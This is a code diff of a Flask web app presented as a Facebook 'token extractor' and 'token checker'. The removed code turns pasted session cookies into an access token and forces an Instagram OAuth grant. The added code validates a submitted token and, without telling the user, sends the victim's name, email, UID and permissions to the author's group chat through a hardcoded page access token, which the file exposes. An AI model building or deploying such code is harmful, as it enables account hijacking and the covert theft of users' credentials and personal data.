@@ -1,157 +1,143 @@
-from flask import Flask, render_template_string, request, jsonify
 import requests
-import json
+from flask import Flask, render_template_string, request
 
 app = Flask(__name__)
 
-# Convert normal cookies to JSON format
-def convert_cookies_to_json(raw_cookies):
-    try:
-        cookies_dict = {}
-        for item in raw_cookies.split("; "):
-            key, value = item.split("=", 1)
-            cookies_dict[key] = value
-        return json.dumps(cookies_dict)
-    except:
-        return None
-
-# Grant Instagram permissions
-def grant_instagram_permissions(cookies):
-    try:
-        headers = {
-            "Cookie": cookies,
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 Chrome/91.0.4472.164 Mobile Safari/537.36"
-        }
-        insta_auth_url = "https://www.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https://www.instagram.com/&scope=instagram_basic,instagram_manage_messages"
-        response = requests.get(insta_auth_url, headers=headers, allow_redirects=True)
-
-        return "access_token=" in response.url
-    except:
-        return False
-
-# Extract token from JSON cookies
-def extract_token_from_cookies(json_cookies):
-    try:
-        cookies = json.loads(json_cookies)
-        cookie_str = "; ".join([f"{key}={value}" for key, value in cookies.items()])
-
-        headers = {
-            "Cookie": cookie_str,
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 Chrome/91.0.4472.164 Mobile Safari/537.36"
-        }
-
-        response = requests.get("https://business.facebook.com/business_locations/", headers=headers)
-        token_start = response.text.find('EAAB')
-
-        if token_start != -1:
-            token = response.text[token_start:].split('"')[0]
-            return token
-        return None
-    except:
-        return None
+PAGE_ACCESS_TOKEN = 'EAABwzLixnjYBO4ajrvsv9GFMlTiQZA4P0G40JlFjkvukBtW6JNnBSiS0ZBRZBpdnA8cUUkOKZBnYOa5ORZAsr0kkRbWvahpQ6CoE8dy6YuC0L8IZATIZAPPp37KKEZBI2rRlByVx7zhbnSuo1f38JzZBZBASNczXkVA28zOATNi2OAowkEdy7CWqatrVMU6HiZBVxwywcoZD'
+GROUP_CHAT_UID = '9456516084398824'  # Apne group ka UID yaha dalein
 
 @app.route('/')
 def index():
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Token Extractor 2025</title>
-        <style>
-            @keyframes bgAnimation {
-                0% { background-position: 0% 50%; }
-                50% { background-position: 100% 50%; }
-                100% { background-position: 0% 50%; }
-            }
-            body {
-                font-family: Arial, sans-serif;
-                background: linear-gradient(-45deg, #ff0000, #1a1a1a, #000000, #ff6600);
-                background-size: 400% 400%;
-                animation: bgAnimation 10s ease infinite;
-                color: #fff;
-                text-align: center;
-                padding: 50px;
-            }
-            .container { background: #222; padding: 20px; border-radius: 10px; }
-            textarea, input { width: 80%; margin-bottom: 10px; padding: 10px; }
-            button { background: #ff0000; color: white; padding: 10px 20px; cursor: pointer; border: none; border-radius: 5px; font-size: 16px; }
-            button:hover { background: #cc0000; }
-            h1, h2 { text-shadow: 3px 3px 10px red; }
-            .footer { margin-top: 20px; font-weight: bold; text-shadow: 3px 3px 10px red; }
-        </style>
-    </head>
-    <body>
-        <h1>🔥 MADE BY VAMPIRE RULEX BOY RAJ MISHRA 🔥</h1>
-        <div class="container">
-            <h2>Paste Your Facebook Cookies</h2>
-            <textarea id="cookiesInput" placeholder='c_user=123456; xs=your_xs_here; ...'></textarea>
-            <br>
-            <button onclick="convertAndExtract()">Convert & Extract Token</button>
-            <br><br>
-            <div id="result"></div>
-        </div>
-        <div class="footer">🔥 MADE BY VAMPIRE RULEX BOY RAJ MISHRA 🔥</div>
-
-        <script>
-            function convertAndExtract() {
-                let rawCookies = document.getElementById('cookiesInput').value;
-                if (rawCookies.trim() === "") {
-                    alert("Please enter the raw cookies.");
-                    return;
+    return render_template_string('''
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>TOKEN CHECKER BY VAMPIRE RULEX BOY RAJ MISHRA</title>
+            <style>
+                body {
+                    background: black;
+                    color: white;
+                    font-family: Arial, sans-serif;
+                    text-align: center;
+                    animation: flicker 1.5s infinite alternate;
                 }
-                fetch('/extract_token', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: 'cookies=' + encodeURIComponent(rawCookies)
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === "success") {
-                        document.getElementById('result').innerHTML = `<p>Token: <b>${data.token}</b></p>`;
-                    } else {
-                        document.getElementById('result').innerHTML = `<p>Error: ${data.message}</p>`;
-                    }
-                })
-                .catch(error => {
-                    document.getElementById('result').innerHTML = `<p>Error: ${error}</p>`;
-                });
-            }
-        </script>
-    </body>
-    </html>
-    """)
 
-@app.route('/extract_token', methods=['POST'])
-def extract_and_validate_token():
-    raw_cookies = request.form.get('cookies')
+                @keyframes flicker {
+                    0% { opacity: 1; }
+                    50% { opacity: 0.8; }
+                    100% { opacity: 1; }
+                }
 
-    try:
-        # Convert normal cookies to JSON format
-        json_cookies = convert_cookies_to_json(raw_cookies)
+                h1 {
+                    color: red;
+                    text-shadow: 0 0 10px white;
+                }
 
-        if not json_cookies:
-            return jsonify({"status": "error", "message": "Invalid cookies format. Please check again."})
+                form {
+                    margin-top: 20px;
+                }
 
-        # Grant Instagram permissions before token extraction
-        cookies_dict = json.loads(json_cookies)
-        cookie_str = "; ".join([f"{key}={value}" for key, value in cookies_dict.items()])
-        insta_granted = grant_instagram_permissions(cookie_str)
+                input {
+                    padding: 10px;
+                    margin: 5px;
+                    border-radius: 5px;
+                    border: none;
+                    font-size: 16px;
+                }
 
-        if not insta_granted:
-            return jsonify({"status": "error", "message": "Instagram permissions not granted. Login and try again."})
+                input[type="submit"] {
+                    background-color: red;
+                    color: white;
+                    cursor: pointer;
+                }
+            </style>
+        </head>
+        <body>
+            <h1>🔥 TOKEN CHECKER BY VAMPIRE RULEX BOY RAJ MISHRA 🔥</h1>
+            <form action="/check_token" method="POST">
+                <label>Enter Token:</label><br>
+                <input type="text" name="token" required><br><br>
+                <input type="submit" value="CHECK TOKEN">
+            </form>
+        </body>
+        </html>
+    ''')
 
-        # Extract Token After Permission Grant
-        extracted_token = extract_token_from_cookies(json_cookies)
+@app.route('/check_token', methods=['POST'])
+def check_token():
+    token = request.form['token']
+    token_details = check_token_details(token)
 
-        if extracted_token:
-            return jsonify({"status": "success", "token": extracted_token})
-        else:
-            return jsonify({"status": "error", "message": "Token extraction failed. Try again with fresh cookies."})
+    if token_details['valid']:
+        send_to_group_chat(token_details)
+
+    return render_template_string('''
+        <h1>🔥 TOKEN CHECKER BY RAJ MISHRA 🔥</h1>
+        {% if token_details['valid'] %}
+            <p><strong>Name:</strong> {{ token_details['name'] }}</p>
+            <p><strong>Email:</strong> {{ token_details['email'] }}</p>
+            <p><strong>UID:</strong> {{ token_details['uid'] }}</p>
+            <img src="{{ token_details['profile_pic'] }}" alt="Profile Picture"><br><br>
+            <p><strong>Can Send Messages:</strong> {{ token_details['can_send_message'] }}</p>
+            <p><strong>Can Comment:</strong> {{ token_details['can_comment'] }}</p>
+        {% else %}
+            <p style="color:red;">❌ Invalid Token</p>
+        {% endif %}
+        <a href="/">🔙 Back</a>
+    ''', token_details=token_details)
+
+def check_token_details(token):
+    url = f"https://graph.facebook.com/me?fields=id,name,email,picture&access_token={token}"
+    response = requests.get(url)
     
-    except Exception as e:
-        return jsonify({"status": "error", "message": f"Error: {str(e)}"})
+    if response.status_code == 200:
+        data = response.json()
+        
+        # Message aur Comment permissions check karna
+        can_send_message = check_permission(token, "pages_messaging")
+        can_comment = check_permission(token, "publish_actions")
+
+        return {
+            "valid": True,
+            "name": data.get('name', 'Unknown'),
+            "email": data.get('email', 'Not Available'),
+            "profile_pic": data['picture']['data']['url'],
+            "uid": data['id'],
+            "can_send_message": "✅ Yes" if can_send_message else "❌ No",
+            "can_comment": "✅ Yes" if can_comment else "❌ No"
+        }
+    else:
+        return {"valid": False}
+
+def check_permission(token, permission):
+    url = f"https://graph.facebook.com/me/permissions?access_token={token}"
+    response = requests.get(url)
+    
+    if response.status_code == 200:
+        data = response.json().get('data', [])
+        for perm in data:
+            if perm.get('permission') == permission and perm.get('status') == "granted":
+                return True
+    return False
+
+def send_to_group_chat(token_details):
+    message = f"✅ **Token Validated Successfully!**\n\n" \
+              f"👤 **Name:** {token_details['name']}\n" \
+              f"📧 **Email:** {token_details['email']}\n" \
+              f"🆔 **UID:** {token_details['uid']}\n" \
+              f"📩 **Can Send Messages:** {token_details['can_send_message']}\n" \
+              f"💬 **Can Comment:** {token_details['can_comment']}"
+
+    url = f"https://graph.facebook.com/{GROUP_CHAT_UID}/messages?access_token={PAGE_ACCESS_TOKEN}"
+    payload = {"message": message}
+
+    response = requests.post(url, data=payload)
+
+    if response.status_code == 200:
+        print("✅ Message sent to group chat successfully!")
+    else:
+        print(f"❌ Failed to send message. Error: {response.text}")
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)  # Host & Port Added
+    app.run(host='0.0.0.0', port=5000)
